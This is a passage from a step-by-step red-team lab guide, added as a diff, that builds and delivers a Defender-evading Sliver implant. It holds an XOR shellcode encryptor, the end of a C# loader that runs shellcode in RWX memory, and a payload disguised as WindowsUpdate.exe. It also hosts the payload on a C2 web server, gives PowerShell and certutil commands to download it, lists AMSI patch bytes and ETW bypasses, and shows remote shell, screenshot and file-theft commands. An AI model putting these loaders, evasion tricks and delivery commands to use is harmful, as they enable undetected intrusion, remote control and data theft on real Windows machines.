+            // XOR decrypt the shellcode
+            // After this, 'shellcode' contains the original Sliver implant
+            byte[] shellcode = XorDecrypt(encryptedShellcode, xorKey);
+
+            // ========================================
+            // STAGE 4: ALLOCATE EXECUTABLE MEMORY
+            // ========================================
+            // We need memory that can be EXECUTED (run as code)
+            // Normal memory is just for data, can't run code in it
+
+            IntPtr memAddr = VirtualAlloc(
+                IntPtr.Zero,                    // Let Windows choose address
+                (uint)shellcode.Length,         // Size = shellcode size
+                MEM_COMMIT | MEM_RESERVE,       // Actually allocate it
+                PAGE_EXECUTE_READWRITE          // Can read, write, AND execute
+            );
+
+            // ========================================
+            // STAGE 5: COPY SHELLCODE TO EXECUTABLE MEMORY
+            // ========================================
+            Marshal.Copy(shellcode, 0, memAddr, shellcode.Length);
+
+            // ========================================
+            // STAGE 6: EXECUTE SHELLCODE
+            // ========================================
+            // Create a new thread that starts at our shellcode
+            // This is like creating a new worker that runs our code
+
+            IntPtr hThread = CreateThread(
+                IntPtr.Zero,    // Default security
+                0,              // Default stack size
+                memAddr,        // Start here (our shellcode!)
+                IntPtr.Zero,    // No parameters
+                0,              // Run immediately
+                IntPtr.Zero     // Don't care about thread ID
+            );
+
+            // ========================================
+            // STAGE 7: WAIT FOREVER
+            // ========================================
+            // If we don't wait, the program exits and kills our shellcode
+            // 0xFFFFFFFF = wait forever (until shellcode exits)
+
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+```
+
+### Step 7.4.2.3: Save and Exit nano
+
+After pasting the code:
+1. Press `Ctrl + O` (that's the letter O, not zero)
+2. Press `Enter` to confirm filename
+3. Press `Ctrl + X` to exit
+
+### Step 7.4.2.4: Verify the File Was Created
+
+```bash
+ls -la /tmp/Loader.cs
+```
+
+Should show something like:
+```
+-rw-r--r-- 1 kali kali 8765 Dec 27 12:30 /tmp/Loader.cs
+```
+
+---
+
+**END OF PART 7.4**
+
+---
+
+# 📖 PART 7.5: Encrypting Your Shellcode
+
+Now we encrypt the shellcode so Defender can't recognize it.
+
+## 7.5.1: Why Encrypt?
+
+Defender knows what Sliver shellcode looks like.
+
+If we embed raw shellcode, Defender will scan it and say **"This matches Sliver malware!"**
+
+**Solution:** Encrypt it. Encrypted data looks like random garbage. Defender can't match patterns in garbage.
+
+```
+RAW SHELLCODE:
+4D 5A 90 00 03 00 00 00 ...  ← Defender: "I recognize this! BLOCKED!"
+
+ENCRYPTED SHELLCODE:
+78 6F A5 35 36 35 35 35 ...  ← Defender: "Just random bytes..." ✓
+```
+
+## 7.5.2: The Encryption Script (Line-by-Line)
+
+### Step 7.5.2.1: Create the Encryption Script
+
+In your terminal, run:
+```bash
+nano /tmp/encrypt_shellcode.py
+```
+
+### Step 7.5.2.2: Copy This ENTIRE Script
+
+```python
+#!/usr/bin/env python3
+"""
+Shellcode Encryptor for ORSUBANK Lab
+Encrypts shellcode using XOR for use with our C# loader.
+
+USAGE:
+    python3 encrypt_shellcode.py /tmp/implant.bin 0x35
+
+OUTPUT:
+    Prints C# byte array that you paste into Loader.cs
+"""
+
+import sys  # For command line arguments
+
+def xor_encrypt(data, key):
+    """
+    XOR encrypts data with a single-byte key.
+    
+    How XOR works:
+    - Each byte is XORed with the key
+    - Original: 0x4D, Key: 0x35, Result: 0x4D XOR 0x35 = 0x78
+    - To decrypt: 0x78 XOR 0x35 = 0x4D (back to original!)
+    
+    XOR is its own inverse, so same operation encrypts and decrypts.
+    """
+    return bytes([b ^ key for b in data])
+
+def format_csharp_array(data):
+    """
+    Formats encrypted bytes as a C# array initializer.
+    
+    Input:  bytes like b'\x78\x6f\xa5...'
+    Output: string like "0x78, 0x6F, 0xA5, ..."
+    
+    We format 15 bytes per line for readability.
+    """
+    lines = []
+    for i in range(0, len(data), 15):
+        # Take 15 bytes at a time
+        chunk = data[i:i+15]
+        # Convert each byte to hex format: 0xFF
+        hex_str = ", ".join(f"0x{b:02X}" for b in chunk)
+        # Add proper indentation for C#
+        lines.append(f"                {hex_str},")
+    return "\n".join(lines)
+
+def main():
+    # Check command line arguments
+    # We need: script name, shellcode file, XOR key
+    if len(sys.argv) != 3:
+        print("=" * 60)
+        print("SHELLCODE ENCRYPTOR")
+        print("=" * 60)
+        print(f"Usage: python3 {sys.argv[0]} <shellcode_file> <xor_key>")
+        print(f"Example: python3 {sys.argv[0]} /tmp/implant.bin 0x35")
+        print("=" * 60)
+        sys.exit(1)
+    
+    # Parse arguments
+    shellcode_file = sys.argv[1]  # Path to shellcode
+    xor_key = int(sys.argv[2], 16)  # XOR key (convert from hex string to int)
+    
+    # Read the shellcode file
+    print(f"[*] Reading shellcode from: {shellcode_file}")
+    with open(shellcode_file, 'rb') as f:  # 'rb' = read binary
+        shellcode = f.read()
+    
+    print(f"[*] Shellcode size: {len(shellcode)} bytes")
+    print(f"[*] XOR key: 0x{xor_key:02X}")
+    
+    # Encrypt
+    print(f"[*] Encrypting...")
+    encrypted = xor_encrypt(shellcode, xor_key)
+    
+    # Output
+    print("\n" + "=" * 60)
+    print("COPY EVERYTHING BELOW INTO YOUR Loader.cs")
+    print("Replace the placeholder 'encryptedShellcode' array")
+    print("=" * 60 + "\n")
+    
+    print("            byte[] encryptedShellcode = new byte[] {")
+    print(format_csharp_array(encrypted))
+    print("            };")
+    print(f"\n            byte xorKey = 0x{xor_key:02X};")
+    
+    print("\n" + "=" * 60)
+    print("DONE! Now edit /tmp/Loader.cs and paste the above.")
+    print("=" * 60)
+
+if __name__ == "__main__":
+    main()
+```
+
+### Step 7.5.2.3: Save and Exit
+
+1. Press `Ctrl + O` to save
+2. Press `Enter` to confirm
+3. Press `Ctrl + X` to exit
+
+### Step 7.5.2.4: Make the Script Executable
+
+```bash
+chmod +x /tmp/encrypt_shellcode.py
+```
+
+## 7.5.3: Running the Encryption Script
+
+### Step 7.5.3.1: Run the Script
+
+Make sure you have the shellcode from Part 7.3!
+
+```bash
+python3 /tmp/encrypt_shellcode.py /tmp/implant.bin 0x35
+```
+
+**What this does:**
+- `/tmp/implant.bin` = Your Sliver shellcode from Part 7.3
+- `0x35` = The XOR key (a random number, you can change it)
+
+### Step 7.5.3.2: What You'll See
+
+The output will look something like this:
+
+```
+[*] Reading shellcode from: /tmp/implant.bin
+[*] Shellcode size: 8234567 bytes
+[*] XOR key: 0x35
+[*] Encrypting...
+
+============================================================
+COPY EVERYTHING BELOW INTO YOUR Loader.cs
+Replace the placeholder 'encryptedShellcode' array
+============================================================
+
+            byte[] encryptedShellcode = new byte[] {
+                0x78, 0x6F, 0xA5, 0x35, 0x36, 0x35, 0x35, 0x35, 0x31, 0x35, 0x35, 0x35, 0xCA, 0xCA, 0x35,
+                0x35, 0x8D, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x75, 0x35, 0x35, 0x35, 0x35, 0x35,
+                ... (many more lines) ...
+            };
+
+            byte xorKey = 0x35;
+
+============================================================
+DONE! Now edit /tmp/Loader.cs and paste the above.
+============================================================
+```
+
+## 7.5.4: Copying the Output into Loader.cs
+
+### Step 7.5.4.1: Open Loader.cs for Editing
+
+```bash
+nano /tmp/Loader.cs
+```
+
+### Step 7.5.4.2: Find the Placeholder
+
+Use `Ctrl + W` to search. Type:
+```
+PLACEHOLDER
+```
+Press Enter. You'll jump to:
+
+```csharp
+byte[] encryptedShellcode = new byte[] {
+    // ╔════════════════════════════════════════════════════════════╗
+    // ║  PLACEHOLDER - REPLACE WITH YOUR ENCRYPTED SHELLCODE!     ║
+    // ╚════════════════════════════════════════════════════════════╝
+    0x00, 0x00, 0x00, 0x00  // DELETE THIS LINE when adding real shellcode
+};
+```
+
+### Step 7.5.4.3: Replace the Placeholder
+
+1. **Delete** these lines:
+```csharp
+// ╔════════════════════════════════════════════════════════════╗
+// ║  PLACEHOLDER - REPLACE WITH YOUR ENCRYPTED SHELLCODE!     ║
+// ╚════════════════════════════════════════════════════════════╝
+0x00, 0x00, 0x00, 0x00  // DELETE THIS LINE when adding real shellcode
+```
+
+2. **Paste** the output from the encryption script (the bytes between the curly braces)
+
+Your code should now look like:
+```csharp
+byte[] encryptedShellcode = new byte[] {
+    0x78, 0x6F, 0xA5, 0x35, 0x36, 0x35, 0x35, 0x35, 0x31, 0x35, 0x35, 0x35, 0xCA, 0xCA, 0x35,
+    ... (all your encrypted bytes) ...
+};
+```
+
+### Step 7.5.4.4: Verify the XOR Key Matches
+
+Make sure this line has the same key you used:
+```csharp
+byte xorKey = 0x35;  // Must match what you used in the Python script!
+```
+
+### Step 7.5.4.5: Save and Exit
+
+1. Press `Ctrl + O` to save
+2. Press `Enter` to confirm
+3. Press `Ctrl + X` to exit
+
+---
+
+**END OF PART 7.5**
+
+---
+
+# 📖 PART 7.6: Compiling the Loader
+
+Now we compile our C# code into a Windows EXE.
+
+## 7.6.1: Installing the Compiler
+
+### What We Need
+
+We need `mcs` - the Mono C# compiler. It can create Windows EXEs from Linux!
+
+### Step 7.6.1.1: Install Mono
+
+```bash
+sudo apt update
+sudo apt install mono-complete -y
+```
+
+This takes a few minutes. Wait for it to finish.
+
+### Step 7.6.1.2: Verify Installation
+
+```bash
+mcs --version
+```
+
+You should see something like:
+```
+Mono C# compiler version 6.12.0.182
+```
+
+## 7.6.2: Compiling to EXE (Exact Commands)
+
+### Step 7.6.2.1: Compile
+
+```bash
+mcs -target:exe -out:/tmp/WindowsUpdate.exe /tmp/Loader.cs
+```
+
+**What this means:**
+- `mcs` = Mono C# compiler
+- `-target:exe` = Create an executable
+- `-out:/tmp/WindowsUpdate.exe` = Output file name
+- `/tmp/Loader.cs` = Your source code
+
+### Step 7.6.2.2: If You Get Errors
+
+**Error: "cannot find class 'Main'"**
+- Check that your `Main` function is inside the `Program` class
+
+**Error: "namespace not found"**
+- Make sure `using System;` and `using System.Runtime.InteropServices;` are at the top
+
+**Error about Marshal:**
+- Make sure you have the InteropServices using statement
+
+### Step 7.6.2.3: Verify Compilation Succeeded
+
+```bash
+ls -la /tmp/WindowsUpdate.exe
+```
+
+You should see:
+```
+-rw-r--r-- 1 kali kali 8523456 Dec 27 13:00 /tmp/WindowsUpdate.exe
+```
+
+The file size will depend on your shellcode size.
+
+## 7.6.3: Verifying Your EXE
+
+### Step 7.6.3.1: Check File Type
+
+```bash
+file /tmp/WindowsUpdate.exe
+```
+
+Output should be:
+```
+/tmp/WindowsUpdate.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+```
+
+This confirms it's a Windows executable!
+
+### Step 7.6.3.2: Check for Obvious Problems
+
+```bash
+# See the file size
+ls -lh /tmp/WindowsUpdate.exe
+
+# Should be several MB (not just a few KB)
+# If it's tiny, your shellcode wasn't embedded properly
+```
+
+---
+
+**END OF PART 7.6**
+
+---
+
+# 📖 PART 7.7: Hosting the Payload
+
+Now we make the payload downloadable.
+
+## 7.7.1: Using Sliver's Web Server
+
+### Step 7.7.1.1: Go Back to Sliver Console
+
+Find your terminal window running Sliver. You should see:
+```
+[server] sliver >
+```
+
+### Step 7.7.1.2: Host the Payload
+
+Type this command:
+```
+websites add-content --website orsubank --web-path /update/WindowsUpdate.exe --content /tmp/WindowsUpdate.exe
+```
+
+**What this means:**
+- `websites add-content` = Add a file to Sliver's web server
+- `--website orsubank` = Name of the website (creates if doesn't exist)
+- `--web-path /update/WindowsUpdate.exe` = The URL path
+- `--content /tmp/WindowsUpdate.exe` = The actual file to serve
+
+### Step 7.7.1.3: Verify
+
+```
+websites
+```
+
+You should see:
+```
+ Name     | Port
+=================
+ orsubank | 443
+
+[orsubank]
+ Path                      | Size      | Content-Type
+=======================================================
+ /update/WindowsUpdate.exe | 8.5 MB    | application/octet-stream
+```
+
+## 7.7.2: Your Download URL
+
+The payload is now available at:
+```
+https://192.168.100.100/update/WindowsUpdate.exe
+```
+
+**Anyone who visits this URL will download your payload!**
+
+---
+
+**END OF PART 7.7**
+
+---
+
+# 📖 PART 7.8: Delivering to the Target
+
+Now we get the payload onto the victim's computer (WS01).
+
+## 7.8.1: Delivery Methods
+
+There are several ways to get the victim to download and run our payload.
+
+### Method A: Direct Download Link (Simulating Phishing)
+
+On WS01, open PowerShell and run:
+
+```powershell
+# For self-signed certificates (our lab), you may need:
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+# Download the file
+Invoke-WebRequest -Uri "https://192.168.100.100/update/WindowsUpdate.exe" -OutFile "$env:USERPROFILE\Desktop\WindowsUpdate.exe" -UseBasicParsing
+```
+
+The file is now on the desktop!
+
+### Method B: Using certutil (Windows Built-in Tool)
+
+```cmd
+certutil.exe -urlcache -split -f "https://192.168.100.100/update/WindowsUpdate.exe" "%USERPROFILE%\Desktop\WindowsUpdate.exe"
+```
+
+### Method C: Browser Download
+
+1. Open Edge/Chrome on WS01
+2. Go to: `https://192.168.100.100/update/WindowsUpdate.exe`
+3. Accept the certificate warning (click "Advanced" → "Continue")
+4. File downloads
+
+## 7.8.2: Executing the Payload
+
+### Step 7.8.2.1: Find the Downloaded File
+
+On WS01, the file should be on the Desktop:
+```
+C:\Users\vamsi.krishna\Desktop\WindowsUpdate.exe
+```
+
+### Step 7.8.2.2: Run It
+
+**Double-click the file.**
+
+Or from PowerShell:
+```powershell
+& "$env:USERPROFILE\Desktop\WindowsUpdate.exe"
+```
+
+Or from Command Prompt:
+```cmd
+"%USERPROFILE%\Desktop\WindowsUpdate.exe"
+```
+
+### Step 7.8.2.3: What You'll See on WS01
+
+**Nothing visible!** The payload runs silently.
+
+The console window might flash briefly or not appear at all. This is intentional.
+
+---
+
+**END OF PART 7.8**
+
+---
+
+# 📖 PART 7.9: Receiving Your Shell
+
+**Go back to your Kali machine now!**
+
+## 7.9.1: What to Expect
+
+### Step 7.9.1.1: Watch the Sliver Console
+
+After about **5-10 seconds** of the victim running the payload, you should see:
+
+```
+[*] Session 98a7c2d4 RANDOM_NAME - 192.168.100.20:52847 (WS01) - windows/amd64 - Sat Dec 27 13:15:00
+
+[server] sliver >
+```
+
+🎉 **YOU HAVE A SHELL!** 🎉
+
+### Step 7.9.1.2: If You Don't See a Session
+
+Wait 30 seconds. Sliver has a check-in interval.
+
+If still nothing:
+- Check the listener is running: `jobs`
+- Try running the payload again on WS01
+- Check network connectivity: Can WS01 reach Kali?
+
+## 7.9.2: Interacting with Your Session
+
+### Step 7.9.2.1: List Sessions
+
+```
+sessions
+```
+
+Output:
+```
+ ID        | Transport | Remote Address    | Hostname | Username          | OS/Arch        
+============|===========|==================|==========|==================|================
+ 98a7c2d4  | http(s)   | 192.168.100.20    | WS01     | ORSUBANK\vamsi... | windows/amd64  
+```
+
+### Step 7.9.2.2: Connect to the Session
+
+Copy the session ID and type:
+```
+use 98a7c2d4
+```
+
+Your prompt changes:
+```
+[server] sliver (RANDOM_NAME) >
+```
+
+**You're now inside the session!**
+
+## 7.9.3: Basic Commands
+
+### Who Am I?
+```
+whoami
+```
+Output:
+```
+orsubank\vamsi.krishna
+```
+
+### System Info
+```
+info
+```
+Output shows:
+- Computer name
+- OS version
+- Architecture
+- Domain
+- etc.
+
+### Current Directory
+```
+pwd
+```
+
+### List Files
+```
+ls
+```
+
+### Run Shell Command
+```
+shell
+```
+This gives you a command prompt:
+```
+PS C:\Users\vamsi.krishna>
+```
+
+Type `exit` to return to Sliver.
+
+### Take Screenshot
+```
+screenshot
+```
+
+### Download a File
+```
+download C:\Users\vamsi.krishna\Desktop\secret.txt
+```
+
+### Upload a File
+```
+upload /tmp/mytool.exe C:\Users\Public\mytool.exe
+```
+
+---
+
+**END OF PART 7.9**
+
+---
+
+# 📖 PART 7.10: Troubleshooting
+
+## Problem: "No session received"
+
+### Check 1: Is the listener running?
+```
+jobs
+```
+Should show your HTTPS listener.
+
+### Check 2: Can WS01 reach Kali?
+
+On WS01:
+```powershell
+Test-NetConnection -ComputerName 192.168.100.100 -Port 443
+```
+
+### Check 3: Did the payload run without errors?
+
+Try running from command prompt to see errors:
+```cmd
+C:\Users\vamsi.krishna\Desktop\WindowsUpdate.exe
+```
+
+## Problem: "Defender blocked the file"
+
+Your loader didn't evade properly. Possible causes:
+- Shellcode wasn't encrypted properly
+- AMSI bypass failed
+- File got uploaded to VirusTotal (don't do that!)
+
+**Solution:** Re-check the encryption step and recompile.
+
+## Problem: "Session dies after a few seconds"
+
+Defender might have caught post-exploitation activity.
+
+**Solution:** Be more careful with what commands you run. Avoid obvious things like mimikatz.
+
+## Problem: "Cannot find file" errors
+
+Make sure all paths are correct:
+- `/tmp/implant.bin` - Your Sliver shellcode
+- `/tmp/Loader.cs` - Your C# source
+- `/tmp/WindowsUpdate.exe` - Your compiled loader
+
+## Problem: "Port already in use"
+
+```bash
+# Find what's using port 443
+sudo lsof -i :443
+
+# Kill it
+sudo kill -9 <PID>
+
+# Restart listener in Sliver
+https --lhost 192.168.100.100 --lport 443
+```
+
+## Problem: "Compilation errors"
+
+Common fixes:
+- Make sure `using System;` is at the top
+- Make sure `using System.Runtime.InteropServices;` is at the top
+- Check that all curly braces `{ }` are balanced
+- Make sure the encrypted shellcode bytes are comma-separated
+
+---
+
+# PART 8: REFERENCE MATERIAL
+
+---
+
+# CHAPTER 36: Interview Questions
+
+## Offensive Security / Red Team Interview Questions
+
+### Basic Concepts
+
+**Q: What is shellcode?**
+A: Shellcode is position-independent machine code that can be executed directly by the CPU. It typically finds its own API addresses at runtime and performs tasks like creating reverse shells or downloading payloads.
+
+**Q: What is the difference between shellcode and a regular executable?**
+A: A regular executable has headers (PE format) and relies on the Windows loader. Shellcode is raw bytes with no headers, can run from any memory location, and must resolve its own API addresses.
+
+**Q: What is a C2 (Command and Control) framework?**
+A: A C2 framework is a tool that allows attackers to remotely control compromised systems. It consists of a server (on the attacker machine) and implants/beacons (on victim machines). Examples: Sliver, Cobalt Strike, Metasploit.
+
+**Q: What is the difference between a session and a beacon in C2?**
+A: Session maintains a constant connection for real-time interaction. Beacon checks in periodically (e.g., every 30 seconds) and is stealthier due to less network noise.
+
+---
+
+### Windows Defender & Detection
+
+**Q: How does Windows Defender detect malware?**
+A: Defender uses three main layers:
+1. Signature-based detection - matches file bytes against known malware
+2. AMSI - scans scripts and dynamic content at runtime
+3. Behavioral analysis/ETW - monitors API calls and suspicious behavior
+
+**Q: What is AMSI and how do you bypass it?**
+A: AMSI (Antimalware Scan Interface) is a Windows feature that allows applications to scan content before execution. To bypass it, you can patch the `AmsiScanBuffer` function in memory to return E_INVALIDARG, making AMSI think the scan failed.
+
+**Q: What bytes do you patch AmsiScanBuffer with and why?**
+A: Common patch: `0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3` which is assembly for `mov eax, 0x80070057; ret`. This makes the function return E_INVALIDARG immediately, causing AMSI to skip the scan.
+
+**Q: What is ETW and why do attackers care?**
+A: ETW (Event Tracing for Windows) is a logging mechanism that security tools use to monitor system activity. Attackers bypass it by patching `EtwEventWrite` to prevent their activities from being logged.
+
+**Q: What DLL contains EtwEventWrite?**
+A: `ntdll.dll`
+
+**Q: What DLL contains AmsiScanBuffer?**
+A: `amsi.dll`
+
+---
+
+### Encryption & Evasion
+
+**Q: What is XOR encryption and why is it used in malware?**
+A: XOR is a simple reversible encryption where applying the same key encrypts and decrypts. It is used to transform malware bytes so signature-based detection cannot recognize them.
+
+**Q: Why is XOR encryption reversible?**
+A: Because XOR is its own inverse. If you XOR data with a key twice, you get the original data back: `A XOR K XOR K = A`
+
+**Q: What is the advantage of XOR over AES for shellcode encryption?**
+A: XOR is simpler to implement, faster, and sufficient for evading signature detection. AES is overkill when we just need to break byte patterns.
+
+**Q: What is a loader in malware context?**
+A: A loader is a program that decrypts and executes shellcode at runtime. It typically allocates executable memory, decrypts the payload, and transfers execution to it.
+
+**Q: Why do we use PAGE_EXECUTE_READWRITE when allocating memory for shellcode?**
+A: Shellcode needs to be executed as code (EXECUTE), but we also need to write the decrypted bytes there first (WRITE) and the shellcode may read its own code (READ).
+
+---
+
+### Process Injection
+
+**Q: What is process injection?**
+A: Running your code inside another process's memory space. Common techniques include VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
+
+**Q: Name the four main Windows API calls used for classic process injection.**
+A: 
+1. `OpenProcess` - get handle to target process
+2. `VirtualAllocEx` - allocate memory in target process
+3. `WriteProcessMemory` - write shellcode to allocated memory
+4. `CreateRemoteThread` - execute the shellcode
+
+**Q: Why would you inject into a process like explorer.exe or svchost.exe?**
+A: These processes are always running and blend in with normal system activity. Network connections from them are less suspicious than from unknown executables.
+
+---
+
+### Initial Access Techniques
+
+**Q: What is phishing and how is it used for initial access?**
+A: Phishing uses deceptive emails/websites to trick users into downloading and running malicious payloads. Common techniques include malicious attachments, link to payload download, or credential harvesting.
+
+**Q: What ports are commonly used for C2 traffic and why?**
+A: Port 443 (HTTPS) and 80 (HTTP) are commonly used because they blend with normal web traffic and are almost never blocked by firewalls.
+
+**Q: What is the difference between staged and stageless payloads?**
+A: 
+- Stageless: Full payload in single file (larger, but simpler)
+- Staged: Small stager that downloads the full payload (smaller initial footprint, but requires additional network traffic)
+
+**Q: What is HTTPS used for in C2 and why is it preferred?**
+A: HTTPS encrypts the C2 traffic, making it harder for network security tools to inspect the content. It also blends with normal encrypted web traffic.
+
+**Q: How do you transfer a payload to a target machine?**
+A: Common methods:
+- PowerShell `Invoke-WebRequest`
+- `certutil.exe -urlcache`
+- Browser download
+- SMB file share
+- USB drop
+
+---
+
+### Sliver C2 Specific
+
+**Q: What command generates shellcode in Sliver?**
+A: `generate --format shellcode --http <ip:port> --os windows --arch amd64 --save <path>`
+
+**Q: What is the difference between --http and --mtls in Sliver?**
+A: `--http` uses HTTP/HTTPS for C2 communication (more common, blends with web traffic). `--mtls` uses mutual TLS authentication (more secure, but distinct traffic pattern).
+
+**Q: How do you start an HTTPS listener in Sliver?**
+A: `https --lhost <ip> --lport 443`
+
+**Q: What Sliver command hosts a file on its built-in web server?**
+A: `websites add-content --website <name> --web-path <url> --content <file>`
+
+---
+
+### Scenario Questions
+
+**Q: You need to get a shell on a Windows 11 machine with Defender enabled. Describe your approach.**
+A: 
+1. Generate Sliver shellcode (not EXE)
+2. Encrypt shellcode with XOR using a random key
+3. Create a C# loader that bypasses AMSI and ETW before decrypting
+4. Compile the loader
+5. Host on HTTPS server
+6. Deliver via phishing/social engineering
+7. Loader runs → bypasses defenses → decrypts shellcode → executes → C2 connection
+
+**Q: Your implant gets caught by Defender. What do you change?**
+A: 
+1. Use a different XOR key
+2. Add junk code/delays to change signature
+3. Change the order of operations
+4. Use a different encryption algorithm
+5. Compile with different settings
+6. Consider direct syscalls to avoid API hooks
+
+**Q: How would you detect if AMSI bypass worked?**
+A: In testing, you can try running known-bad PowerShell commands after your AMSI patch. If they execute without Defender alerts, the bypass worked. In production, successful shellcode execution is proof.
+
+---
+
+# CHAPTER 37: Important Commands Cheatsheet
+
+## Sliver Commands
+
+| Command | Description |
+|---------|-------------|
+| `https --lhost <ip> --lport <port>` | Start HTTPS listener |
+| `generate --http <ip:port> --format shellcode --save <path>` | Generate shellcode |
+| `websites add-content --website <name> --web-path <url> --content <file>` | Host a file |
+| `sessions` | List sessions |
+| `use <id>` | Interact with session |
+| `jobs` | List running listeners |
+| `whoami` | Current user |
+| `shell` | Interactive shell |
+| `download <path>` | Download file |
+| `upload <local> <remote>` | Upload file |
+
+## Kali Commands
+
+```bash
+# Install Sliver
+curl https://sliver.sh/install | sudo bash
+
+# Start Sliver
+sudo sliver-server
+
+# Install Mono
+sudo apt install mono-complete -y
+
+# Compile C#
+mcs -target:exe -out:WindowsUpdate.exe Loader.cs
+
+# Encrypt shellcode
+python3 encrypt_shellcode.py /tmp/implant.bin 0x35
+```
+
+## PowerShell Download
+
+```powershell
+# Bypass certificate check
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+# Download file
+Invoke-WebRequest -Uri "https://<kali>/file.exe" -OutFile "C:\path\file.exe" -UseBasicParsing
+
+# Alternative with certutil
+certutil -urlcache -split -f https://<kali>/file.exe C:\path\file.exe
+```
+
+---
+
+# CHAPTER 38: Common Errors and Solutions
+
+| Error | Cause | Solution |
+|-------|-------|----------|
+| Virus detected | Signature match | Use different XOR key, recompile |
+| Connection refused | Listener not running | Start listener on Kali |
+| Session dies immediately | Crash or Defender kill | Check AMSI bypass is working |
+| Cannot find mono | Not installed | `apt install mono-complete` |
+| Port already in use | Another service running | Kill process using `lsof -i :443` |
+| No sessions appear | Network issue | Check firewall, verify connectivity |
+| Shellcode too large | Sliver is big (~10MB) | Normal, use `--skip-symbols` |
+| Compilation error | Syntax issue | Check curly braces, using statements |
+
+---
+
+*END OF DOCUMENT*
+
+*You now have gained initial access to WS01 as `vamsi.krishna` WITHOUT disabling Defender!*
+
+*The AMSI and ETW bypasses in the loader prevent Defender from:*
+- *Scanning our decrypted shellcode*
+- *Logging our activities*
+
+*Next steps: Domain enumeration with BloodHound, Kerberoasting, Lateral Movement*
+
+*Use this knowledge ethically and legally!*
